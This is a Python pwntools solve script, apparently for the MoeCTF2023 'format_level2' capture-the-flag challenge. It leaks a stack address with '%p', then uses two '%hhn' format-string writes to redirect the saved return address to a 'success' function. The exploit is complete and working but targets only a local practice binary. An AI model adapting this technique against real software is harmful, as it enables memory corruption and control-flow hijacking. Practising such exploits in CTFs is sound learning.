"""MoeCTF2023
printf 修改返回值地址

0e:0038│ ebp 0xffa97588 —▸ 0xffa975a8 —▸ 0xffa975b8 ◂— 0x0
0f:003c│     0xffa9758c —▸ 0x804974a (game+121) ◂— jmp 0x804976d
...
16:0058│  0xffa975a8 —▸ 0xffa975b8 ◂— 0x0
17:005c│  0xffa975ac —▸ 0x8049717 (game+70) ◂— jne 0x8049713 ; 0x17 -> 23偏移为返回值地址
修改为 success 0x08049317
"""
from pwn import *

# p = process('./format_level2')
p = gdb.debug('./format_level2', 'b*0x080496A0\nc')
context.log_level = 'debug'

p.sendlineafter(":", b"3")
p.sendlineafter(":", b"%p")

p.recvuntil("0x")
stack = int(p.recvline()[:-1], 16)
func_ret = stack + 64
success('func_ret:' + hex(func_ret))
p.sendline(b"3")
payload = b"%23p%10$hhn".ljust(12, b'a') + p32(func_ret)  # 原值为 0x8049797 第一次修改低位为 0x17 -> 0x8049717
p.send(payload)
p.sendlineafter(":", b"3")
payload = b"%147p%10$hhn".ljust(12, b'a') + p32(func_ret + 1)  # 第二次修改第二个Bytes为 0x93 ->0x8049317
p.sendlineafter(":", payload)
p.sendlineafter(":", b"4")

p.interactive()
